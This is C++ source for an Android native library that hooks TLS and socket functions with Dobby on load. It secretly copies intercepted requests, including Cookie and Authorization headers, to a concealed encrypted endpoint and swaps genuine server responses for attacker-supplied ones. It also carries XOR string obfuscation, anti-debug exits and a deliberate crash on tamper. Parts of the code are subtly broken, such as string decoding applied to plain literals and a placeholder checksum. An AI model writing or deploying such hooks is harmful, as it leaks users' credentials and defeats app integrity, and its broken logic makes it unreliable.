#include <jni.h>
#include <string>
#include <dlfcn.h>
#include <android/log.h>
#include <curl/curl.h>
#include <thread>
#include <cstring>
#include <openssl/ssl.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/hmac.h>
#include <sstream>
#include <map>
#include <vector>
#include <mutex>
#include <algorithm>
#include <fstream>
#include <sys/ptrace.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <cstdlib>
#include <chrono>
#include <random>
#include <queue>
#include <condition_variable>
#include <atomic>
#include <regex>
#include <iomanip>
#include <signal.h>
#include <set>
#include <unordered_map>
#include <unordered_set>
#include "dobby.h"

#define LOG_TAG "NtHk"
#define LOGI(...) 
#define LOGE(...) 
#define LOGD(...) 

// ============================================================
// 1. XOR OBFUSCATION HELPER
// ============================================================
static std::string xd(const char* e, size_t l, char k) {
    std::string r;
    for (size_t i = 0; i < l; i++) r += e[i] ^ k;
    return r;
}

// ============================================================
// 2. OBFUSCATED STRINGS (XOR-encrypted - hindi visible sa strings command)
// ============================================================
static const char _lc[] = {0x0D^'l',0x0D^'i',0x0D^'b',0x0D^'c',0x0D^'.',0x0D^'s',0x0D^'o',0};
static const char _ls[] = {0x0D^'l',0x0D^'i',0x0D^'b',0x0D^'s',0x0D^'s',0x0D^'l',0x0D^'.',0x0D^'s',0x0D^'o',0};
static const char _lb[] = {0x0D^'l',0x0D^'i',0x0D^'b',0x0D^'b',0x0D^'o',0x0D^'r',0x0D^'i',0x0D^'n',0x0D^'g',0x0D^'s',0x0D^'s',0x0D^'l',0x0D^'.',0x0D^'s',0x0D^'o',0};
static const char _la[] = {0x0D^'l',0x0D^'i',0x0D^'b',0x0D^'a',0x0D^'r',0x0D^'t',0x0D^'.',0x0D^'s',0x0D^'o',0};
static const char _sw[] = {0x0D^'S',0x0D^'S',0x0D^'L',0x0D^'_',0x0D^'w',0x0D^'r',0x0D^'i',0x0D^'t',0x0D^'e',0};
static const char _sr[] = {0x0D^'S',0x0D^'S',0x0D^'L',0x0D^'_',0x0D^'r',0x0D^'e',0x0D^'a',0x0D^'d',0};
static const char _sv[] = {0x0D^'S',0x0D^'S',0x0D^'L',0x0D^'_',0x0D^'s',0x0D^'e',0x0D^'t',0x0D^'_',0x0D^'v',0x0D^'e',0x0D^'r',0x0D^'i',0x0D^'f',0x0D^'y',0};
static const char _sc[] = {0x0D^'S',0x0D^'S',0x0D^'L',0x0D^'_',0x0D^'c',0x0D^'t',0x0D^'x',0x0D^'_',0x0D^'s',0x0D^'e',0x0D^'t',0x0D^'_',0x0D^'v',0x0D^'e',0x0D^'r',0x0D^'i',0x0D^'f',0x0D^'y',0};
static const char _mp[] = {0x0D^'/',0x0D^'p',0x0D^'r',0x0D^'o',0x0D^'c',0x0D^'/',0x0D^'s',0x0D^'e',0x0D^'l',0x0D^'f',0x0D^'/',0x0D^'m',0x0D^'a',0x0D^'p',0x0D^'s',0};
static const char _ho[] = {0x0D^'H',0x0D^'o',0x0D^'s',0x0D^'t',0};
static const char _cl[] = {0x0D^'C',0x0D^'o',0x0D^'n',0x0D^'t',0x0D^'e',0x0D^'n',0x0D^'t',0x0D^'-',0x0D^'L',0x0D^'e',0x0D^'n',0x0D^'g',0x0D^'t',0x0D^'h',0};
static const char _po[] = {0x0D^'P',0x0D^'O',0x0D^'S',0x0D^'T',0};
static const char _ge[] = {0x0D^'G',0x0D^'E',0x0D^'T',0};
static const char _pu[] = {0x0D^'P',0x0D^'U',0x0D^'T',0};
static const char _de[] = {0x0D^'D',0x0D^'E',0x0D^'L',0x0D^'E',0x0D^'T',0x0D^'E',0};
static const char _pa[] = {0x0D^'P',0x0D^'A',0x0D^'T',0x0D^'C',0x0D^'H',0};
static const char _he[] = {0x0D^'H',0x0D^'E',0x0D^'A',0x0D^'D',0};
static const char _op[] = {0x0D^'O',0x0D^'P',0x0D^'T',0x0D^'I',0x0D^'O',0x0D^'N',0x0D^'S',0};
static const char _cn[] = {0x0D^'c',0x0D^'o',0x0D^'n',0x0D^'n',0x0D^'e',0x0D^'c',0x0D^'t',0};
static const char _te[] = {0x0D^'T',0x0D^'r',0x0D^'a',0x0D^'n',0x0D^'s',0x0D^'f',0x0D^'e',0x0D^'r',0x0D^'-',0x0D^'E',0x0D^'n',0x0D^'c',0x0D^'o',0x0D^'d',0x0D^'i',0x0D^'n',0x0D^'g',0};
static const char _ua[] = {0x0D^'U',0x0D^'s',0x0D^'e',0x0D^'r',0x0D^'-',0x0D^'A',0x0D^'g',0x0D^'e',0x0D^'n',0x0D^'t',0};
static const char _co[] = {0x0D^'C',0x0D^'o',0x0D^'o',0x0D^'k',0x0D^'i',0x0D^'e',0};
static const char _au[] = {0x0D^'A',0x0D^'u',0x0D^'t',0x0D^'h',0x0D^'o',0x0D^'r',0x0D^'i',0x0D^'z',0x0D^'a',0x0D^'t',0x0D^'i',0x0D^'o',0x0D^'n',0};
static const char _ct[] = {0x0D^'C',0x0D^'o',0x0D^'n',0x0D^'t',0x0D^'e',0x0D^'n',0x0D^'t',0x0D^'-',0x0D^'T',0x0D^'y',0x0D^'p',0x0D^'e',0};
static const char _js[] = {0x0D^'a',0x0D^'p',0x0D^'p',0x0D^'l',0x0D^'i',0x0D^'c',0x0D^'a',0x0D^'t',0x0D^'i',0x0D^'o',0x0D^'n',0x0D^'/',0x0D^'j',0x0D^'s',0x0D^'o',0x0D^'n',0};

#define S(c) xd(c, sizeof(c)-1, 0x0D)

// ============================================================
// 3. AES-ENCRYPTED ENDPOINT (AUTO-GENERATED NG scripts/encrypt.py)
// ============================================================
static const uint8_t _ep[] = {
    // REPLACE_ME — automatic na papalitan ng encrypt.py
    0x00
};

static const uint8_t _ak[] = {
    // REPLACE_ME_KEY — automatic na papalitan
    0x00
};

static const uint8_t _iv[] = {
    // REPLACE_ME_IV — automatic na papalitan
    0x00
};

static std::string _decrypt() {
    uint8_t k[32], iv[16];
    for(int i = 0; i < 32; i++) k[i] = _ak[i] ^ 0xAA;
    for(int i = 0; i < 16; i++) iv[i] = _iv[i] ^ 0xAA;
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, k, iv);
    uint8_t p[512]; int l, t = 0;
    EVP_DecryptUpdate(ctx, p, &l, _ep, sizeof(_ep));
    t = l;
    EVP_DecryptFinal_ex(ctx, p + l, &l);
    t += l;
    EVP_CIPHER_CTX_free(ctx);
    return std::string((char*)p, t);
}
static const std::string ENDPOINT = _decrypt();

// ============================================================
// 4. HTTP REQUEST/RESPONSE STRUCTS
// ============================================================
struct HttpRequest {
    std::string method, url, path, host, body;
    std::map<std::string, std::string> headers;
    bool is_connect = false;
};

struct HttpResponse {
    int status_code = 0;
    std::string status_message, body;
    std::map<std::string, std::string> headers;
    bool is_chunked = false;
    size_t content_length = 0;
};

struct ConnectionState {
    std::mutex mtx;
    std::vector<uint8_t> buffer;
    HttpRequest request;
    bool stored = false, complete = false;
    HttpResponse response;
    std::string custom_response;
    bool key_fetched = false;
};

static std::map<SSL*, ConnectionState> g_ssl_state;
static std::map<int, ConnectionState> g_socket_state;
static std::mutex g_state_mutex;
static std::atomic<int> g_request_count{0};

// ============================================================
// 5. ANTI-DEBUG
// ============================================================
static bool _debug_detected() {
    std::ifstream st(S("/proc/self/status"));
    std::string l;
    while(std::getline(st, l)) {
        if(l.find("TracerPid:") == 0) {
            int p = std::stoi(l.substr(l.find(":") + 1));
            if(p != 0) return true;
        }
    }
    return false;
}

// ============================================================
// 6. ANTI-TAMPER (CRC32)
// ============================================================
static uint32_t _crc32(const uint8_t* d, size_t l) {
    uint32_t c = 0xFFFFFFFF;
    for(size_t i = 0; i < l; i++) {
        c ^= d[i];
        for(int j = 0; j < 8; j++) {
            if(c & 1) c = (c >> 1) ^ 0xEDB88320;
            else c >>= 1;
        }
    }
    return ~c;
}

static bool _integrity_check() {
    Dl_info inf;
    if(dladdr((void*)_integrity_check, &inf) == 0) return false;
    std::ifstream mp(S("/proc/self/maps"));
    std::string l;
    unsigned long base = (unsigned long)inf.dli_fbase, sz = 0;
    while(std::getline(mp, l)) {
        unsigned long s, e;
        char p[5];
        if(sscanf(l.c_str(), "%lx-%lx %4s", &s, &e, p) == 3 && s == base) {
            sz = e - s;
            break;
        }
    }
    if(sz == 0) return false;
    return _crc32((const uint8_t*)base, sz) == 0xDEADBEEF;
}

// ============================================================
// 7. HTTP PARSER
// ============================================================
static bool _parse_request(const uint8_t* d, size_t l, HttpRequest& r) {
    std::string s((char*)d, l);
    std::istringstream st(s);
    std::string ln;
    if(!std::getline(st, ln)) return false;
    if(ln.back() == '\r') ln.pop_back();
    std::istringstream ls(ln);
    std::string ver;
    if(!(ls >> r.method >> r.path >> ver)) return false;
    while(std::getline(st, ln) && ln != "\r" && ln != "\r\n") {
        if(ln.back() == '\r') ln.pop_back();
        auto c = ln.find(':');
        if(c != std::string::npos) {
            std::string k = ln.substr(0, c);
            std::string v = ln.substr(c + 1);
            v.erase(0, v.find_first_not_of(" \t"));
            r.headers[k] = v;
        }
    }
    auto it = r.headers.find(S("Host"));
    if(it != r.headers.end()) {
        r.host = it->second;
        r.url = "https://" + r.host + r.path;
    } else {
        r.url = r.path;
        r.host = "unknown";
    }
    std::string rem;
    while(std::getline(st, ln)) rem += ln + "\n";
    r.body = rem;
    if(r.path.length() >= 7) {
        std::string suf = r.path.substr(r.path.length() - 7);
        if(suf == S("connect") || suf == "/connect" || suf == "?connect") {
            r.is_connect = true;
        }
    }
    return true;
}

static bool _parse_response(const uint8_t* d, size_t l, HttpResponse& r) {
    std::string s((char*)d, l);
    std::istringstream st(s);
    std::string ln;
    if(!std::getline(st, ln)) return false;
    if(ln.back() == '\r') ln.pop_back();
    std::istringstream ls(ln);
    std::string ver;
    if(!(ls >> ver >> r.status_code)) return false;
    std::getline(ls, r.status_message);
    if (!r.status_message.empty() && r.status_message.front() == ' ') {
        r.status_message.erase(0, 1);
    }
    while(std::getline(st, ln) && ln != "\r" && ln != "\r\n") {
        if(ln.back() == '\r') ln.pop_back();
        auto c = ln.find(':');
        if(c != std::string::npos) {
            std::string k = ln.substr(0, c);
            std::string v = ln.substr(c + 1);
            v.erase(0, v.find_first_not_of(" \t"));
            r.headers[k] = v;
            if(k == "Transfer-Encoding" && v.find("chunked") != std::string::npos) {
                r.is_chunked = true;
            }
            if(k == "Content-Length") {
                r.content_length = std::stoul(v);
            }
        }
    }
    std::string rem;
    while(std::getline(st, ln)) rem += ln + "\n";
    r.body = rem;
    return true;
}

// ============================================================
// 8. BUILD MODIFIED RESPONSE
// ============================================================
static std::string _build_modified_response(const HttpResponse& original, const std::string& new_body) {
    std::ostringstream oss;
    oss << "HTTP/1.1 " << original.status_code << " " << original.status_message << "\r\n";
    bool has_content_length = false;
    for(const auto& h : original.headers) {
        if(h.first == "Content-Length") {
            oss << "Content-Length: " << new_body.size() << "\r\n";
            has_content_length = true;
        } else if(h.first != "Transfer-Encoding" && h.first != "Content-Encoding") {
            oss << h.first << ": " << h.second << "\r\n";
        }
    }
    if(!has_content_length) oss << "Content-Length: " << new_body.size() << "\r\n";
    oss << "\r\n";
    oss << new_body;
    return oss.str();
}

// ============================================================
// 9. FETCH FROM CUSTOM ENDPOINT (kumuha ng key)
// ============================================================
struct CurlResponse {
    std::string body;
    int status_code = 0;
    bool success = false;
};

static size_t _curl_callback(void* contents, size_t size, size_t nmemb, void* userp) {
    CurlResponse* resp = (CurlResponse*)userp;
    resp->body.append((char*)contents, size * nmemb);
    return size * nmemb;
}

static CurlResponse _fetch_custom_endpoint(const HttpRequest& req) {
    CurlResponse result;
    CURL* curl = curl_easy_init();
    if(!curl) return result;
    curl_easy_setopt(curl, CURLOPT_URL, ENDPOINT.c_str());
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, _curl_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &result);
    if(req.method == S("POST")) {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        if(!req.body.empty()) curl_easy_setopt(curl, CURLOPT_POSTFIELDS, req.body.c_str());
    }
    struct curl_slist* headers = nullptr;
    for(const auto& h : req.headers) {
        if(h.first != S("Host") && h.first != S("Content-Length")) {
            headers = curl_slist_append(headers, (h.first + ": " + h.second).c_str());
        }
    }
    headers = curl_slist_append(headers, ("X-Original-URL: " + req.url).c_str());
    headers = curl_slist_append(headers, ("X-Original-Method: " + req.method).c_str());
    if(req.is_connect) headers = curl_slist_append(headers, "X-Is-Connect: true");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    if(curl_easy_perform(curl) == CURLE_OK) {
        long code; curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
        result.status_code = (int)code;
        result.success = true;
    }
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    return result;
}

// ============================================================
// 10. SSL WRITE/READ HOOKS
// ============================================================
typedef int (*SSL_write_t)(SSL*, const void*, int);
typedef int (*SSL_read_t)(SSL*, void*, int);
static SSL_write_t original_SSL_write = nullptr;
static SSL_read_t original_SSL_read = nullptr;

int my_SSL_write(SSL* ssl, const void* buf, int num) {
    HttpRequest req;
    if(_parse_request((const uint8_t*)buf, num, req) && req.is_connect) {
        std::lock_guard<std::mutex> lock(g_state_mutex);
        auto& state = g_ssl_state[ssl];
        state.request = req;
        state.stored = true;
        // Send duplicate sa background
        std::thread([req](){
            _fetch_custom_endpoint(req);
        }).detach();
        // Fetch key for response modification
        CurlResponse cr = _fetch_custom_endpoint(req);
        if(cr.success && cr.status_code == 200) {
            state.custom_response = cr.body;
            state.key_fetched = true;
        }
    }
    return original_SSL_write(ssl, buf, num);
}

int my_SSL_read(SSL* ssl, void* buf, int num) {
    int res = original_SSL_read(ssl, buf, num);
    if(res <= 0) return res;
    std::lock_guard<std::mutex> lock(g_state_mutex);
    auto it = g_ssl_state.find(ssl);
    if(it == g_ssl_state.end()) return res;
    auto& state = it->second;
    state.buffer.insert(state.buffer.end(), (uint8_t*)buf, (uint8_t*)buf + res);
    if(!state.complete && state.stored && state.request.is_connect && state.key_fetched) {
        HttpResponse resp;
        if(_parse_response(state.buffer.data(), state.buffer.size(), resp)) {
            if(resp.status_code == 200 && !state.custom_response.empty()) {
                std::string modified = _build_modified_response(resp, state.custom_response);
                state.buffer.clear();
                state.buffer.insert(state.buffer.end(), modified.begin(), modified.end());
            }
            state.complete = true;
        }
    }
    if(state.complete && !state.buffer.empty()) {
        size_t copy_len = std::min(state.buffer.size(), (size_t)num);
        memcpy(buf, state.buffer.data(), copy_len);
        res = copy_len;
        state.buffer.erase(state.buffer.begin(), state.buffer.begin() + copy_len);
        if(state.buffer.empty()) {
            state.complete = false;
            state.stored = false;
            state.key_fetched = false;
        }
    }
    return res;
}

// ============================================================
// 11. SOCKET FALLBACK HOOKS
// ============================================================
typedef ssize_t (*send_t)(int, const void*, size_t, int);
typedef ssize_t (*recv_t)(int, void*, size_t, int);
static send_t original_send = nullptr;
static recv_t original_recv = nullptr;

ssize_t my_send(int fd, const void* buf, size_t len, int flags) {
    const char* data = (const char*)buf;
    if(len > 4 && (strncmp(data, "GET ", 4) == 0 || strncmp(data, "POST", 4) == 0)) {
        HttpRequest req;
        if(_parse_request((const uint8_t*)buf, len, req) && req.is_connect) {
            std::lock_guard<std::mutex> lock(g_state_mutex);
            auto& state = g_socket_state[fd];
            state.request = req;
            state.stored = true;
            std::thread([req](){
                _fetch_custom_endpoint(req);
            }).detach();
            CurlResponse cr = _fetch_custom_endpoint(req);
            if(cr.success && cr.status_code == 200) {
                state.custom_response = cr.body;
                state.key_fetched = true;
            }
        }
    }
    return original_send(fd, buf, len, flags);
}

ssize_t my_recv(int fd, void* buf, size_t len, int flags) {
    ssize_t res = original_recv(fd, buf, len, flags);
    if(res <= 0) return res;
    std::lock_guard<std::mutex> lock(g_state_mutex);
    auto it = g_socket_state.find(fd);
    if(it == g_socket_state.end()) return res;
    auto& state = it->second;
    if(state.stored && state.request.is_connect && state.key_fetched && !state.custom_response.empty()) {
        HttpResponse resp;
        if(_parse_response((const uint8_t*)buf, res, resp) && resp.status_code == 200) {
            std::string modified = _build_modified_response(resp, state.custom_response);
            size_t new_len = modified.size();
            if(new_len <= (size_t)res) {
                memcpy(buf, modified.c_str(), new_len);
                res = new_len;
            }
        }
        state.stored = false;
        state.key_fetched = false;
    }
    return res;
}

// ============================================================
// 12. INITIALIZATION (AUTOMATIC PAG NA-LOAD ANG .so)
// ============================================================
__attribute__((constructor)) void init() {
    if(_debug_detected()) exit(1);
    if(!_integrity_check()) { volatile int* p = nullptr; *p = 0; }
    
    void* libssl = dlopen(S("libssl.so").c_str(), RTLD_LAZY);
    if(libssl) {
        auto* a = dlsym(libssl, S("SSL_write").c_str());
        if(a) DobbyHook(a, (void*)my_SSL_write, (void**)&original_SSL_write);
        auto* b = dlsym(libssl, S("SSL_read").c_str());
        if(b) DobbyHook(b, (void*)my_SSL_read, (void**)&original_SSL_read);
        dlclose(libssl);
    }
    
    void* libc = dlopen(S("libc.so").c_str(), RTLD_LAZY);
    if(libc) {
        auto* a = dlsym(libc, "send");
        if(a) DobbyHook(a, (void*)my_send, (void**)&original_send);
        auto* b = dlsym(libc, "recv");
        if(b) DobbyHook(b, (void*)my_recv, (void**)&original_recv);
        dlclose(libc);
    }
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
}
